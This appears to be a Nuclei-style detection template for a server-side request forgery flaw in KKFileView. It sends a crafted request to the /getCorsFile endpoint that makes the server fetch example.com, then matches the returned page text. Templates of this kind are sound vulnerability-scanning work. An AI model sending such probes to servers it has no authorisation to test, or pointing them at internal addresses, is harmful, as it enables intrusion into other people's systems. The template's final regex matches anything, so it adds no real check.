id: kkfileview-ssrf
info:
  name: KKFileView SSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    A Server-Side Request Forgery (SSRF) vulnerability in KKFileView allows remote attackers to fetch internal URLs.
  reference:
    - https://github.com/kekingcn/kkFileView/issues/128
http:
  - raw:
      - |
        GET /getCorsFile?urlPath=http://example.com HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<h1>Example Domain</h1>"
          - "This domain is for use in illustrative examples in documents."
      - type: regex
        part: body
        regex:
          - "(?m)(?<!example\\.com)"
